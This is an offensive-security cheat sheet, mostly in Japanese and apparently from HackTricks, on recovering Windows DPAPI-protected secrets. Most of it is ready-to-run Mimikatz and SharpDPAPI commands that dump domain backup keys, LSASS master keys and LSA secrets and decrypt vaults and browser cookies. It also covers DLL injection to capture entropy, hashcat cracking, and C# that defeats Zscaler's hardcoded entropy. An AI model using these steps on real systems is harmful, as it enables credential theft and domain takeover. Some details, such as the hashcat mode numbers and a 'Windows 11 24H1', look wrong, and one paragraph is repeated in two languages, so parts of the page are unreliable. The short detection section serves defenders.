# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## DPAPI とは

The Data Protection API (DPAPI) は主に Windows オペレーティングシステム内で、**非対称秘密鍵の対称暗号化**に使用され、ユーザーまたはシステムのシークレットをエントロピー源として利用します。この手法により、開発者はユーザーのログオンシークレットから導出した鍵、またはシステム暗号化の場合はシステムのドメイン認証シークレットを使ってデータを暗号化できるため、暗号化鍵自体の保護を開発者が管理する必要がなくなります。

最も一般的な DPAPI の使用方法は **`CryptProtectData` と `CryptUnprotectData`** 関数を通じてで、これによりアプリケーションは現在ログオンしているプロセスのセッションでデータを安全に暗号化・復号できます。つまり、暗号化されたデータは同じユーザーまたはシステムでなければ復号できません。

さらに、これらの関数は暗号化・復号時に使用される **`entropy` パラメータ** も受け取るため、このパラメータを使って暗号化されたものを復号するには、暗号化時に使われたのと同じ entropy 値を提供する必要があります。

### Users key generation

DPAPI は各ユーザーに対して資格情報に基づく一意の鍵（**`pre-key`** と呼ばれる）を生成します。この鍵はユーザーのパスワードや他の要素から導出され、アルゴリズムはユーザーの種類によって異なりますが最終的には SHA1 になります。例えば、ドメインユーザーの場合は **ユーザーの NTLM ハッシュに依存します**。

これは特に重要で、攻撃者がユーザーのパスワードハッシュを入手できれば：

- そのユーザーの鍵を使って、API に問い合わせることなく DPAPI で暗号化されたあらゆるデータを復号できる
- 有効な DPAPI 鍵を生成するためにパスワードをオフラインでクラッキングしようと試みる

さらに、ユーザーが DPAPI を使ってデータを暗号化するたびに、新しい **master key** が生成されます。この master key が実際にデータを暗号化するために使用されます。各 master key にはそれを識別する **GUID**（Globally Unique Identifier）が付与されます。

マスターキーは **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** ディレクトリに保存され、`{SID}` はそのユーザーの Security Identifier を表します。マスターキーはユーザーの **`pre-key`** によって暗号化されて保存されるとともに、リカバリ用に **domain backup key** でも暗号化されて保存されます（つまり同じ鍵が 2 つの異なる方法で暗号化されて保存されます）。

注意点として、**マスターキーを暗号化するために使用される domain key はドメインコントローラーにあり変更されない**ため、攻撃者がドメインコントローラーにアクセスできればドメインバックアップキーを取得してドメイン内のすべてのユーザーのマスターキーを復号できます。

暗号化された blob には、そのデータを暗号化するために使用されたマスターキーの **GUID** がヘッダー内に含まれています。

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### マシン／システムキーの生成

これはマシンがデータを暗号化するために使うキーです。これは、SYSTEM ユーザのみがアクセスできる特別なキーである **DPAPI_SYSTEM LSA secret** に基づいています。このキーは、マシンレベルの資格情報やシステム全体のシークレットなど、システム自身がアクセスする必要のあるデータを暗号化するために使われます。

なお、これらのキーは **don't have a domain backup** ため、ローカルでのみアクセス可能です:

- **Mimikatz** は LSA シークレットをダンプして `mimikatz lsadump::secrets` コマンドでアクセスできます
- シークレットはレジストリ内に保存されているため、管理者はアクセスするために DACL の権限を変更することができます。レジストリのパスは: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### DPAPI によって保護されるデータ

DPAPI によって保護される個人データには以下が含まれます:

- Windows の資格情報
- Internet Explorer と Google Chrome のパスワードおよび自動補完データ
- Outlook や Windows Mail のようなアプリケーションでのメールや内部 FTP アカウントのパスワード
- 共有フォルダ、リソース、ワイヤレスネットワーク、Windows Vault（暗号化キーを含む）のパスワード
- リモートデスクトップ接続、.NET Passport、および各種暗号化・認証用のプライベートキーのパスワード
- Credential Manager によって管理されるネットワークパスワードや、CryptProtectData を使うアプリ（Skype、MSN messenger など）内の個人データ
- レジストリ内の暗号化された BLOB
- ...

システムで保護されたデータには以下が含まれます:
- Wi‑Fi パスワード
- スケジュールされたタスクのパスワード
- ...

### Master key の抽出オプション

- ユーザーがドメイン管理者権限を持っている場合、ドメイン内の全ユーザーの master key を復号するために **domain backup key** にアクセスできます:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- ローカル管理者権限があれば、**LSASSメモリにアクセス**して、接続中の全ユーザーのDPAPIマスターキーとSYSTEMキーを抽出できます。
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- ユーザーがローカル管理者権限を持っている場合、**DPAPI_SYSTEM LSA secret** にアクセスしてマシンマスターキーを復号できます：
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- ユーザーのpasswordまたはNTLM hashが分かっている場合、ユーザーの**master keysを直接decryptできます**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- ユーザーとしてセッション内にいる場合、DC に **backup key to decrypt the master keys using RPC** を要求できます。あなたが local admin でユーザーがログイン中であれば、これを行うために **steal his session token** することができます:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vaultの一覧
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI暗号化データにアクセス

### DPAPI暗号化データを見つける

一般ユーザーの**保護されたファイル**は以下にあります:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 上記パスでは `\Roaming\` を `\Local\` に変更して確認してください。

列挙の例:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) はファイルシステム、レジストリ、および B64 ブロブ内の DPAPI 暗号化ブロブを検出できます:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Note that [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (from the same repo) can be used to decrypt using DPAPI sensitive data like cookies.

### アクセスキーとデータ

- **Use SharpDPAPI** を使用して、現在のセッションの DPAPI 暗号化ファイルから資格情報を取得します:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Get credentials info**（暗号化されたデータや guidMasterKey を含む情報）を取得する。
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

ユーザーが **domain backup key** を要求している際の masterkey を RPC を使って復号する:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** ツールは、masterkey の復号のために次の引数もサポートしています（`/rpc` を使ってドメインのバックアップキーを取得できる点、`/password` でプレーンテキストのパスワードを使用できる点、あるいは `/pvk` で DPAPI ドメインのプライベートキー ファイルを指定できる点に注意）:
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **masterkeyを使用してデータを復号する**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
The **SharpDPAPI** tool also supports these arguments for `credentials|vaults|rdg|keepass|triage|blob|ps` decryption (note how it's possible to use `/rpc` to get the domains backup key, `/password` to use a plaintext password, `/pvk` to specify a DPAPI domain private key file, `/unprotect` to use current users session...):

The **SharpDPAPI** ツールは `credentials|vaults|rdg|keepass|triage|blob|ps` の復号化に対してこれらの引数もサポートします（`/rpc` を使ってドメインのバックアップキーを取得できること、`/password` を使ってプレーンテキストのパスワードを使用できること、`/pvk` で DPAPI ドメインのプライベートキー ファイルを指定できること、`/unprotect` で現在のユーザーのセッションを利用できることに注意...）：
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- **current user session** を使用してデータを復号する:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### オプションの entropy（"Third-party entropy"）の取り扱い

一部のアプリケーションは `CryptProtectData` に追加の **entropy** 値を渡します。この値がなければ、正しい masterkey を知っていても blob を復号できません。したがって、Microsoft Outlook や一部の VPN クライアントのようにこの方法で保護された資格情報を狙う場合は、entropy の取得が不可欠です。

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) は、ターゲットプロセス内の DPAPI 関数にフックを掛け、提供された任意の entropy を透過的に記録する user-mode DLL です。`outlook.exe` や `vpnclient.exe` のようなプロセスに対して EntropyCapture を **DLL-injection** モードで実行すると、各 entropy バッファを呼び出しプロセスおよび blob にマッピングしたファイルが出力されます。取得した entropy は後で **SharpDPAPI** (`/entropy:`) や **Mimikatz** (`/entropy:<file>`) に渡してデータを復号するために使用できます。
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

MicrosoftはWindows 10 v1607（2016）から**context 3**マスターキー形式を導入しました。`hashcat` v6.2.6（2023年12月）はハッシュモード**22100**（DPAPI masterkey v1 context）、**22101**（context 1）、**22102**（context 3）を追加し、マスターキー ファイルから直接ユーザーのパスワードをGPUで高速にクラッキングできるようになりました。したがって、攻撃者はターゲットシステムとやり取りすることなく、ワードリストやブルートフォース攻撃を実行できます。

`DPAPISnoop` (2024) はこのプロセスを自動化します：
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
このツールは Credential と Vault の blobs を解析し、cracked keys で復号して平文パスワードをエクスポートすることもできます。

### 他のマシンのデータにアクセスする

In **SharpDPAPI and SharpChrome** では、リモートマシンのデータにアクセスするために **`/server:HOST`** オプションを指定できます。もちろん、そのマシンにアクセスできる必要があり、以下の例では **domain backup encryption key is known** と仮定します:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## その他のツール

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) は、LDAPディレクトリからすべてのユーザとコンピュータを抽出し、RPCを介してドメインコントローラのバックアップキーを抽出する処理を自動化するツールです。スクリプトは抽出したコンピュータのIPアドレスを解決し、すべてのコンピュータに対して smbclient を実行してすべてのユーザのDPAPIブロブを取得し、ドメインバックアップキーで全てを復号します。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAPから抽出したコンピュータリストがあれば、知らなかったサブネットすべてを見つけることができます！

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) はDPAPIで保護されたシークレットを自動でダンプできます。2.x リリースでは以下が導入されました：

* 数百ホストからのブロブの並列収集
* **context 3** マスターキーの解析とHashcat自動クラッキング統合
* Chrome の "App-Bound" 暗号化クッキーのサポート（次節参照）
* エンドポイントを繰り返しポーリングして新規作成されたブロブを差分取得する新しい **`--snapshot`** モード

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) はマスターキー/クレデンシャル/ボールトファイルのC#パーサーで、Hashcat/JtR形式を出力し、オプションで自動的にクラッキングを呼び出せます。Windows 11 24H1 までのマシンおよびユーザマスターキーフォーマットを完全にサポートしています。


## 一般的な検出

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` およびその他のDPAPI関連ディレクトリへのアクセス。
- 特に **C$** や **ADMIN$** のようなネットワーク共有からのアクセス。
- LSASSメモリにアクセスしたりマスターキーをダンプするための **Mimikatz**、**SharpDPAPI** などのツールの使用。
- イベント **4662**: *An operation was performed on an object* – **`BCKUPKEY`** オブジェクトへのアクセスと相関させて検出可能。
- プロセスが *SeTrustedCredManAccessPrivilege* (Credential Manager) を要求したときのイベント **4673/4674**

---
### 2023–2025 の脆弱性とエコシステムの変化

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (2023年11月)。ネットワークアクセスを持つ攻撃者がドメインメンバーを騙して悪意あるDPAPIバックアップキーを取得させ、ユーザーマスターキーを復号可能にする可能性がありました。2023年11月の累積更新で修正されています — 管理者はドメインコントローラ(DC)およびワークステーションが完全にパッチ適用されていることを確認する必要があります。
* **Chrome 127 “App-Bound” cookie encryption** (2024年7月) は従来のDPAPIのみの保護を置き換え、ユーザの **Credential Manager** に保存される追加のキーを導入しました。クッキーのオフライン復号には現在、DPAPIマスターキーと **GCM-wrapped app-bound key** の両方が必要です。SharpChrome v2.3 と DonPAPI 2.x はユーザコンテキストで実行すると追加キーを回復できます。


### ケーススタディ: Zscaler Client Connector – SIDから導出されるカスタムエントロピー

Zscaler Client Connector は `C:\ProgramData\Zscaler` 下に複数の設定ファイル（例: `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`）を格納します。各ファイルは **DPAPI (Machine scope)** で暗号化されていますが、ベンダーはディスク上に保存されるのではなく *実行時に計算される* **カスタムエントロピー** を提供します。

エントロピーは次の2つの要素から再構築されます：

1. `ZSACredentialProvider.dll` に埋め込まれたハードコードされたシークレット。
2. その設定に属するWindowsアカウントの **SID**。

DLL に実装されているアルゴリズムは次と等価です：
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
シークレットがディスクから読み取れるDLLに埋め込まれているため、**SYSTEM 権限を持つ任意のローカル攻撃者は任意の SID に対するエントロピーを再生成できる**ので、ブロブをオフラインで復号できます:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
復号すると、完全な JSON 構成が得られ、各 **デバイスのポスチャチェック** とその期待値を含みます — これはクライアント側のバイパスを試みる際に非常に価値のある情報です。

> TIP: 他の暗号化されたアーティファクト (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) は DPAPI **without** entropy (`16` zero bytes) で保護されています。したがって SYSTEM 権限を取得すれば `ProtectedData.Unprotect` で直接復号できます。

## References

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
